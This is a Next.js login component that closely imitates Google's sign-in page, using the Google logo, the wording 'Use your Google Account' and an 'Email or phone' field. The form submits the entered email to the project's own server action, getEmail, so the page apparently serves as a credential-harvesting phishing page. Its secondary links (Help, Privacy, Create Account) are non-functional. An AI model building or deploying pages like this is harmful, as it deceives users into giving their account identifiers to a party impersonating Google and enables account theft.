import NextButtonLogin from "@/components/NextButtonLogin";
import { getEmail } from "@/actions";
export default function Login() {
  return (
    <div className="flex w-screen overflow-hidden relative flex-col bg-white text-black p-5 h-screen">
      <div className="w-full  flex h-20">
        <svg
          xmlns="https://www.w3.org/2000/svg"
          width="48"
          height="48"
          viewBox="0 0 48 48"
          aria-hidden="true"
          jsname="jjf7Ff"
        >
          <path
            fill="#4285F4"
            d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"
          ></path>
          <path
            fill="#34A853"
            d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"
          ></path>
          <path
            fill="#FBBC05"
            d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"
          ></path>
          <path
            fill="#EA4335"
            d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"
          ></path>
          <path fill="none" d="M2 2h44v44H2z"></path>
        </svg>
      </div>
      <h1 className="text-3xl pb-3">Sign in</h1>
      <span>Use your Google Account</span>
      <form action={getEmail}>
        <div>
          <input
            required
            className="border p-3 mb-3 mt-3 rounded bg-white w-full"
            placeholder="Email or phone"
            type="text"
            name="email"
          />
          <span className="text-blue-700 ">Forget Email?</span>
          <h1 className=" pt-10">
            Not your computer? Use Guest mode to sign in privately.
          </h1>
          <span className="text-blue-700">
            Learn more about using Guest mode
          </span>
        </div>
        <div className="flex  w-full justify-between items-center mt-10">
          <a className="text-blue-700" href="">
            Create Account{" "}
          </a>
          <NextButtonLogin />
        </div>
      </form>
      <div className="flex w-full justify-between absolute bottom-2 left-0 items-center gap-3 p-5 ">
        <span className=" text-nowrap">English (United States) </span>
        <div className="flex gap-3">
          <span>Help</span>
          <span>Privacy</span>
          <span>Team</span>
        </div>
      </div>
    </div>
  );
}
